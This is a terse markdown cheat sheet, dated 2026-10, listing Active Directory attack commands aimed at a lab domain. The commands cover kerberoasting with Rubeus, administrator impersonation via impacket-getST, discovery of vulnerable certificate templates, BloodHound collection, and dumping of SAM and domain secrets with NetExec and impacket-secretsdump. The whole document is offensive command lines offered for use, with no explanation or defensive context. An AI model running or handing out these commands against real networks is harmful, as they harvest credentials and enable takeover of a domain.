# impacket

```bash
get-netuser -spn | fl serviceprincipalname, samaccountname
rubeus kerberoast /nowrap
impacket-getST -spn cifs/host.lab -impersonate administrator
certipy find -vulnerable -stdout
bloodhound-python -c All -d lab.local
nxc smb lab-dc --local-auth --sam
impacket-secretsdump lab/svc_backup@dc01.lab.local
```

> updated 2026-10
